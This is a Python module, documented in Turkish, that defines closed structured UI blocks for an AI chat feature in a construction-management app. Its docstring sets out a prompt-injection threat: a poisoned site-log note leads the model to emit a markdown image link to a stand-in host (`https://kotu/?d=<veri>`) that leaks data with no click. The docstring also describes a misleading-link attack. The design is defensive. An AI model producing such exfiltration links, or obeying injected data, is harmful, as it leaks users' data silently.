"""Yapısal cevap blokları — **modelin metninden ASLA üretilmez** (AI-CHAT-2 / K1).

Mockup'ın (`projedesign/AI Chat.dc.html`) metrik kartları, kâr barı, uyarı
şeridi, varlık listesi, "Kaynak" rozetleri ve aksiyon düğmeleri bu dosyadaki
**kapalı birleşimden** çizilir.

## 🔴 NEDEN MODELİN METNİ AYRIŞTIRILMAZ

`AiMessage.tsx` bugün model çıktısını **düz metin** basar ve gerekçesi ölçülmüş
bir saldırı yoludur: CSP `img-src 'self'` uzak görseli yüklemese de **istek yine
çıkar**, ve zehirlenmiş bir şantiye günlüğü notu modele
`![](https://kotu/?d=<veri>)` ürettirirse veri **tıklama olmadan** sızar.
Markdown/HTML çözücü eklemek bu savunmayı kaldırırdı.

Bu yüzden zengin bloklar **araç sonucunun yapısal verisinden**, sunucudaki saf
bir eşleyiciyle (`presenters.py`) üretilir. Model bir bloğun **varlığını da,
içeriğini de** etkileyemez: hangi bloğun çizileceği çağrılan **aracın adına**
bağlıdır, modelin yazdığı hiçbir bayta değil.

## 🔴 URL TAŞINMAZ — `EkranAnahtari` taşınır

`navigation.py` kararı burada da geçerlidir ve gerekçesi aynıdır (S22): serbest
bir URL alanı, model'e "ekranda 'Stok girişi' yazsın ama altta
`/ayarlar/izin-matrisi` dursun" dedirtir. Blok yalnız **hangi ekran** ve
(varsa) **hangi kimlik** olduğunu söyler; yolu istemci kendi rota kataloğundan
(`src/lib/routes.ts`) kurar. `routes.ts` AYRI BİR GİT DEPOSUNDADIR, yani
sözleşme repo sınırını anahtar olarak geçer, yol olarak değil.

## 🔴 SERBEST HTML TAŞIMAZ

Hiçbir alan işaretleme taşımaz. Metin alanları düz metindir ve istemci onları
`dangerouslySetInnerHTML` olmadan basar. Vurgu (mockup'ın `<strong>`ları)
**yapısal olarak** taşınır: kalın yazılacak parça ayrı bir alandır
(`deger_metni`), metnin içine gömülü bir etiket değil.

## Biçimlendirme SUNUCUDA yapılır

`deger_metni` `"₺2.100.000"` gibi **hazır** gelir. Sebep: para biçimlemesi
`Decimal` → yerel ayar zinciri gerektirir ve iki katmanda iki kez yapılırsa iki
kez ayrışır. İstemci hiçbir aritmetik yapmaz — yaparsa B19'un yasakladığı
"kısmi kümeden toplam hesaplama" istemciye taşınmış olurdu.
"""

from __future__ import annotations

import dataclasses
import enum
import uuid
from typing import Final

from app.modules.ai.navigation import EkranAnahtari


class BlokTonu(str, enum.Enum):
    """Bloğun görsel tonu — **anlam taşır, süs değildir**.

    `uyari` ile `kritik` ayrıdır: mockup'ın stok kartlarında "3 gün" kırmızı,
    "5 gün" turuncudur ve ikisi aynı tona düşerse ekran aciliyeti yalan söyler.
    """

    notr = "notr"
    bilgi = "bilgi"
    olumlu = "olumlu"
    uyari = "uyari"
    kritik = "kritik"


@dataclasses.dataclass(frozen=True, slots=True)
class BaglantiKalemi:
    """Bir derin bağlantı. 🔴 `url` alanı YOKTUR ve olmayacaktır."""

    etiket: str
    ekran: EkranAnahtari
    #: Varlık kimliği — istemci rotayı bu kimlikle **kendi kataloğundan** kurar.
    kimlik: uuid.UUID | None = None
    #: Aksiyon şeridinde birincil (dolu mavi) düğme mi.
    birincil: bool = False


@dataclasses.dataclass(frozen=True, slots=True)
class OranDilimi:
    """Yığılmış barın tek dilimi. `yuzde` 0-100 arası, **sunucuda hesaplandı**."""

    etiket: str
    yuzde: float
    ton: BlokTonu
    #: Alt etiketteki hazır metin (mockup: "Taşeron maliyeti %55,2").
    alt_etiket: str


@dataclasses.dataclass(frozen=True, slots=True)
class VarlikKalemi:
    """Mockup'ın stok kartı: ikon + ad + alt metin + doluluk çubuğu + rozet."""

    ad: str
    alt_metin: str | None = None
    #: Doluluk çubuğunun dolu oranı (0-100). `None` ise çubuk **çizilmez** —
    #: 0 yazmak "stok bitti" demektir ve bu uydurulmuş bir olgu olurdu.
    doluluk_yuzde: float | None = None
    ton: BlokTonu = BlokTonu.notr
    rozet_metni: str | None = None
    #: Kartın kendisi bir derin bağlantı olabilir.
    baglanti: BaglantiKalemi | None = None


# --------------------------------------------------------------------------- #
# KAPALI BİRLEŞİM — `tip` ayırıcısı
# --------------------------------------------------------------------------- #


@dataclasses.dataclass(frozen=True, slots=True)
class YapisalBlok:
    """Ortak taban. `tip` alanı alt sınıflarda **sabittir**."""

    @property
    def tip(self) -> str:
        return _BLOK_TIPLERI[type(self)]


@dataclasses.dataclass(frozen=True, slots=True)
class MetrikBloku(YapisalBlok):
    """Mockup 154-170: iki sütunlu metrik kartı."""

    baslik: str
    #: 🔴 HAZIR metin ("₺2.100.000"). İstemci biçimlemez.
    deger_metni: str
    ton: BlokTonu = BlokTonu.bilgi
    alt_metin: str | None = None
    #: Alt metnin başındaki renkli nokta (mockup: turuncu "onay bekliyor").
    alt_ton: BlokTonu | None = None


@dataclasses.dataclass(frozen=True, slots=True)
class OranBariBloku(YapisalBlok):
    """Mockup 172-192: yığılmış kâr barı."""

    baslik: str
    deger_metni: str
    #: Sağ üstteki büyük yüzde (mockup: "%44,8").
    yuzde_metni: str
    yuzde_alt_etiketi: str
    dilimler: tuple[OranDilimi, ...]
    ton: BlokTonu = BlokTonu.olumlu


@dataclasses.dataclass(frozen=True, slots=True)
class UyariBloku(YapisalBlok):
    """Mockup 194-201: sol kenarlı uyarı şeridi.

    🔴 `metin` DÜZ METİNDİR. Mockup'ın `<strong>`ları `vurgular` demetiyle
    taşınır: istemci metnin içinde bu parçaları **birebir eşleyerek** kalınlaştırır
    ve eşleşmeyeni sessizce düz bırakır. Böylece işaretleme hiçbir zaman veri
    kanalından geçmez.
    """

    metin: str
    ton: BlokTonu = BlokTonu.uyari
    vurgular: tuple[str, ...] = ()


@dataclasses.dataclass(frozen=True, slots=True)
class VarlikListesiBloku(YapisalBlok):
    """Mockup 253-292: ikonlu + çubuklu + rozetli varlık kartları."""

    kalemler: tuple[VarlikKalemi, ...]
    baslik: str | None = None


@dataclasses.dataclass(frozen=True, slots=True)
class OzetBloku(YapisalBlok):
    """Mockup 294-299: gri özet kutusu."""

    metin: str
    vurgular: tuple[str, ...] = ()


@dataclasses.dataclass(frozen=True, slots=True)
class KaynakBloku(YapisalBlok):
    """Mockup 203-211 / 301-307: "Kaynak" rozet şeridi.

    🔴 Bu blok bir **korkuluktur**, süs değil: kullanıcı cevabın hangi veriden
    türediğini görür. Kaynaklar aracın **beyan ettiği** ekranlardır, modelin
    iddia ettikleri değil.
    """

    kalemler: tuple[BaglantiKalemi, ...]


@dataclasses.dataclass(frozen=True, slots=True)
class AksiyonBloku(YapisalBlok):
    """Mockup 213-218 / 309-312: aksiyon düğmeleri."""

    kalemler: tuple[BaglantiKalemi, ...]


#: 🔴 KAPALI: bu sözlükte olmayan bir sınıf akışa giremez. Bekçisi
#: `test_aichat2_bloklar.py::test_blok_tipleri_KAPALI`.
_BLOK_TIPLERI: Final[dict[type, str]] = {
    MetrikBloku: "metrik",
    OranBariBloku: "oran_bari",
    UyariBloku: "uyari",
    VarlikListesiBloku: "varlik_listesi",
    OzetBloku: "ozet",
    KaynakBloku: "kaynak",
    AksiyonBloku: "aksiyon",
}

BLOK_TIPLERI: Final[frozenset[str]] = frozenset(_BLOK_TIPLERI.values())
